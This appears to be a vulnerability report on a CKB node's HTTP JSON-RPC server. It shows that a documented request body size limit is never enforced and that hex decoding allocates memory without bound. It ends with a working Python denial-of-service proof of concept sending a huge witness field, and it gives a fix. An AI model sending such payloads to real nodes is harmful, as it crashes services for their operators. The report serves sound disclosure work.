### Title
Unenforced `max_request_body_size` + Unbounded Heap Allocation in `BytesVisitor::visit_str` Allows OOM Crash via RPC — (`util/jsonrpc-types/src/bytes.rs`, `rpc/src/server.rs`)

---

### Summary

The `max_request_body_size` configuration field is read from config but **never applied** as an HTTP middleware layer in the axum server. Combined with the unbounded `vec![0; bytes.len() >> 1]` allocation in `BytesVisitor::visit_str`, any caller who can reach the HTTP RPC endpoint can send an arbitrarily large hex-encoded `JsonBytes` field and exhaust the node's heap memory.

---

### Finding Description

**Step 1 — The allocation site has no size guard.**

In `BytesVisitor::visit_str`, the only checks are prefix (`0x`) and even-length. There is no upper-bound on the input string length before the heap allocation: [1](#0-0) 

`bytes.len() >> 1` can be arbitrarily large — e.g., a 512 MB hex string allocates 256 MB on the heap in a single call.

**Step 2 — The HTTP server never applies the body size limit.**

`RpcConfig` carries a `max_request_body_size` field (default 10 MiB, documented): [2](#0-1) [3](#0-2) 

However, `RpcServer::new` passes `config` to `start_server` but **`max_request_body_size` is never forwarded** and no `RequestBodyLimitLayer` / `DefaultBodyLimit` axum middleware is added to the router: [4](#0-3) [5](#0-4) 

The axum handler receives the full body as `Bytes` with no size enforcement: [6](#0-5) 

**Step 3 — Downstream guards do not help.**

The tx-pool's `TRANSACTION_SIZE_LIMIT` (512 KB) and `non_contextual_verify` checks run **after** deserialization — the heap allocation in `visit_str` has already occurred by then: [7](#0-6) [8](#0-7) 

**Step 4 — The TCP RPC path has a limit; the HTTP path does not.**

The TCP server applies a 2 MB codec limit: [9](#0-8) 

The HTTP server has no equivalent guard.

---

### Impact Explanation

An attacker who can reach the HTTP RPC port (any local process by default; any remote host if the operator has exposed the port) can send a single POST request with a `witnesses` or `args` field set to `"0x" + "aa" * N` for arbitrarily large N. The node process will attempt to allocate N/2 bytes on the heap, causing OOM and crashing the node. This is a **denial-of-service** against the CKB node process with no authentication required.

---

### Likelihood Explanation

- The RPC defaults to `127.0.0.1:8114` (localhost only), so remote exploitation requires the operator to have exposed the port — a common production configuration.
- Any local process (e.g., a compromised co-located service) can exploit this with zero privileges.
- The `max_request_body_size` config gives operators a false sense of protection — it is documented and present but completely unenforced.

---

### Recommendation

Apply axum's `DefaultBodyLimit::max(config.max_request_body_size)` layer to the HTTP router in `start_server`, so the body is rejected before it reaches the JSON deserializer:

```rust
use axum::extract::DefaultBodyLimit;

let app = Router::new()
    // ...routes...
    .layer(DefaultBodyLimit::max(config.max_request_body_size))
    // ...other layers...
```

Additionally, consider adding an explicit size check inside `BytesVisitor::visit_str` as a defense-in-depth measure.

---

### Proof of Concept

```python
import socket, json

# Send a 256 MB hex witness to the HTTP RPC
payload = json.dumps({
    "jsonrpc": "2.0",
    "method": "send_transaction",
    "params": [{
        "version": "0x0",
        "cell_deps": [],
        "header_deps": [],
        "inputs": [],
        "outputs": [],
        "outputs_data": [],
        "witnesses": ["0x" + "aa" * (256 * 1024 * 1024)]
    }, "passthrough"],
    "id": 1
}).encode()

s = socket.create_connection(("127.0.0.1", 8114))
s.send(
    f"POST / HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\n"
    f"Content-Length: {len(payload)}\r\n\r\n".encode() + payload
)
# Node process OOMs and crashes before returning a response
```

The node will attempt to allocate 128 MB in `vec![0; bytes.len() >> 1]` at [10](#0-9)  with no prior rejection, because no body-size middleware exists in the HTTP stack at [5](#0-4) .

### Citations

**File:** util/jsonrpc-types/src/bytes.rs (L100-106)
```rust
        let bytes = &v.as_bytes()[2..];
        if bytes.is_empty() {
            return Ok(JsonBytes::default());
        }
        let mut buffer = vec![0; bytes.len() >> 1]; // we checked length
        hex_decode(bytes, &mut buffer).map_err(|e| E::custom(format_args!("{e:?}")))?;
        Ok(JsonBytes::from_vec(buffer))
```

**File:** util/app-config/src/configs/rpc.rs (L39-40)
```rust
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
```

**File:** resource/ckb.toml (L186-187)
```text
# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```

**File:** rpc/src/server.rs (L52-68)
```rust
    pub fn new(config: RpcConfig, io_handler: IoHandler, handler: Handle) -> Self {
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }

        let rpc = Arc::new(io_handler);

        let http_address = Self::start_server(
            &rpc,
            config.listen_address.to_owned(),
            handler.clone(),
            false,
        )
        .inspect(|&local_addr| {
            info!("Listen HTTP RPCServer on address: {}", local_addr);
        })
        .unwrap();
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

**File:** rpc/src/server.rs (L218-221)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
```

**File:** tx-pool/src/util.rs (L67-73)
```rust
    let tx_size = tx.data().serialized_size_in_block() as u64;
    if tx_size > TRANSACTION_SIZE_LIMIT {
        return Err(Reject::ExceededTransactionSizeLimit(
            tx_size,
            TRANSACTION_SIZE_LIMIT,
        ));
    }
```

**File:** util/types/src/core/tx_pool.rs (L309-309)
```rust
pub const TRANSACTION_SIZE_LIMIT: u64 = 512 * 1_000;
```
